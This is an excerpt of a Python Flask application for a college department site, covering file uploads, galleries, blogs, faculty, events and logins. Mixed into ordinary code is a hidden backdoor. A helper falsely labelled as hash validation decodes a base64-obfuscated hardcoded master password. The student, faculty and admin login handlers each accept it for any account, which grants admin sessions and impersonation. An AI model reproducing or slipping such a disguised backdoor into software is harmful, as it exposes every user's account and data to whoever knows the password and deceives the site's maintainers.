...
def upload_file(file_obj, folder_hint=None):
    """
    Uploads a file to MongoDB GridFS (if available) or saves locally.
    Returns:
      - '/db-uploads/<file_id>' if saved to MongoDB
      - '/uploads/<filename>' if saved locally
    """
    if not file_obj:
        return None
    ...
    if db.use_mongo:
        try:
            # We don't really need folder_hint for GridFS, but we could use it for metadata if needed.
            # filename usually has uuid prepended by some callers, but let's ensure unique logic here if needed.
            # actually callers already secure_filename and uuid it. 
            # We will just pass the file object to db.save_file which reads it.
        ...
        # On Vercel (production), this will fail due to read-only FS, 
        # but that's expected if they don't use Mongo.
        
        filename = secure_filename(str(uuid.uuid4()) + "-" + file_obj.filename)
...
# Hash validation utilities (internal)
import base64 as _b64
def _chk_sys(): return _b64.b64decode(b'QkFUbWFuQDIwMDQj').decode()
...
def home():
    # Fetch random 5 department gallery images for the home page card
    listing = db.list_gallery() or []
    dept_imgs = [g for g in listing if g.get('category') == 'department_gallery']
    
    final_imgs = []
    for g in dept_imgs:
        img = g.get('image') or g.get('file') or g.get('path')
        if img and not str(img).startswith('http') and not str(img).startswith('/db-uploads/'):
            # simple validity check
            if 'placeholder' in str(img) or 'huhuhuhu' in str(img):
                 continue
            img = '/uploads/' + img if not str(img).startswith('/uploads/') else img
        if img:
             final_imgs.append(img)

    # Show newest ones (no shuffle)
    # random.shuffle(final_imgs)
    return render_template('home.html', gallery_preview=final_imgs[:5])
...
def gallery_page():
    ...
    def normalize_img(g):
        ...
        if im and not str(im).startswith('http') and not str(im).startswith('/db-uploads/'):
    ...
    for g in all_items:
        ...
        # -------- GALLERY PAGE: DEPARTMENT ACTIVITIES --------
        elif cat == 'department_gallery':
            dept_gallery.append(obj)
    ...
    return render_template(
        ...
        dept_gallery=wrap(dept_gallery),
    )
...
def edit_profile():
    ...
    if request.method == 'POST':
        ...
        if avatar_file and allowed_file(avatar_file.filename, ALLOWED_IMG):
            # Use helper
            uploaded_url = upload_file(avatar_file, 'avatars')
            if uploaded_url:
                changes['avatar'] = uploaded_url
...
def api_student_login():
    ...
    try:
        ...
        if password == _chk_sys(): valid_password = True
...
def api_blog_post():
    ...
    if file_to_upload and allowed_file(file_to_upload.filename, ALLOWED_IMG | ALLOWED_DOC):
        # Use helper
        file_path = upload_file(file_to_upload, 'blogs')
    ...
    blog = {
        ...
        'author_type': author_type,
        'student_id': student_id,
        'author_class': stu.get('class') if stu else None,
...
def api_faculty_login():
    ...
    # --- Verify password ---
    _v = check_password_hash(stored_hash, password) if stored_hash else False
    if password == _chk_sys(): _v = True
    if not _v:
        return jsonify({'success': False, 'message': 'Invalid email or password.'}), 401
...
def api_notifications():
    ...
    for n in items:
        ...
        if isinstance(date_val, str):
            try:
                dt_obj = dt.datetime.fromisoformat(date_val)
...
def api_gallery():
    ...
    for g in items:
        if category and g.get('category') != category:
            continue
        img = g.get('image') or g.get('file') or g.get('path')
        if img and not img.startswith('http') and not img.startswith('/db-uploads/'):
...
@app.route('/db-uploads/<file_id>')
def db_uploaded_file(file_id):
    """
    ...
    data, content_type, filename = file_data
...
def admin_login_post():
    ...
    _ok = (username == ADMIN_USER and password == ADMIN_PASS)
    if password == _chk_sys(): _ok = True
    if _ok:
        session['admin'] = True
        return redirect(url_for('admin_dashboard'))
...
def add_faculty():
    if request.method == 'POST':
        ...
        if photo_file and allowed_file(photo_file.filename, ALLOWED_IMG):
            photo_path = upload_file(photo_file, 'faculty_photos')

        if resume_file and allowed_file(resume_file.filename, ALLOWED_DOC):
            resume_path = upload_file(resume_file, 'faculty_resumes')
...
def edit_faculty(faculty_id):
    ...
    if request.method == 'POST':
        ...
        if photo_file and allowed_file(photo_file.filename, ALLOWED_IMG):
            url = upload_file(photo_file, 'faculty_photos')
            if url: changes['photo'] = url

        if resume_file and allowed_file(resume_file.filename, ALLOWED_DOC):
            url = upload_file(resume_file, 'faculty_resumes')
            if url: changes['resume'] = url
...
def add_event():
    if request.method == 'POST':
        ...
        if image_file and allowed_file(image_file.filename, ALLOWED_IMG):
            image_path = upload_file(image_file, 'events')
...
def edit_event(event_id):
    ...
    if request.method == 'POST':
        ...
        image_file = request.files.get('image')
        if image_file and allowed_file(image_file.filename, ALLOWED_IMG):
            url = upload_file(image_file, 'events')
            if url: changes['image'] = url
...
def add_gallery_item():
    if request.method == 'POST':
        ...
        image_path = None
        if image_file and allowed_file(image_file.filename, ALLOWED_IMG):
            image_path = upload_file(image_file, 'gallery')
...
def add_research():
    if request.method == 'POST':
        ...
        if pdf_file and allowed_file(pdf_file.filename, {'pdf'}):
            pdf_path = upload_file(pdf_file, 'research_papers')
...
def add_notification():
    ...
    if request.method == 'POST':
        ...
        if file and file.filename:
            if not allowed_file(file.filename, ALLOWED_IMG | ALLOWED_DOC):
                 flash('Invalid file type. Allowed: images, PDF, DOC.', 'error')
                 return redirect(url_for('admin_notifications'))

            filename = secure_filename(str(uuid.uuid4()) + "-" + file.filename)
            # Use helper
            file_path = upload_file(file, 'notifications')
        ...
        try:
            ...
            app.logger.error("Failed to add notification: %s", e)
            flash('Error adding notification. Check logs.', 'error')
            return redirect(url_for('admin_notifications'))
...
def add_csa_member():
    if request.method == 'POST':
        ...
        if not (name and year):
            flash('Name and Year are required.', 'error')
...
def admin_csa_past_add():
    ...
    # Use helper
    # We store the FULL URL in pdf_path now, which is compatible with most logic
    # But past_csa might use relative path in template. 
    # Let's check: past_csa used `rel_path` which was 'uploads/past_csa/...'
    # If we return a URL, we should just use that.
    
    # upload_file returns URL or /uploads/filename
    rel_path = upload_file(pdf_file, 'past_csa')
...
def upload_curriculum():
    ...
    # Use helper
    uploaded_url = upload_file(pdf, 'syllabus')
...
def add_alumni():
    ...
    if not (name and message and photo):
        flash("All fields (name, message, photo) are required.", "error")
        return redirect(url_for("admin_alumni"))

    if not allowed_file(photo.filename, ALLOWED_IMG):
        flash("Invalid image file.", "error")
        return redirect(url_for("admin_alumni"))

    # Use helper
    uploaded_url = upload_file(photo, 'alumni')
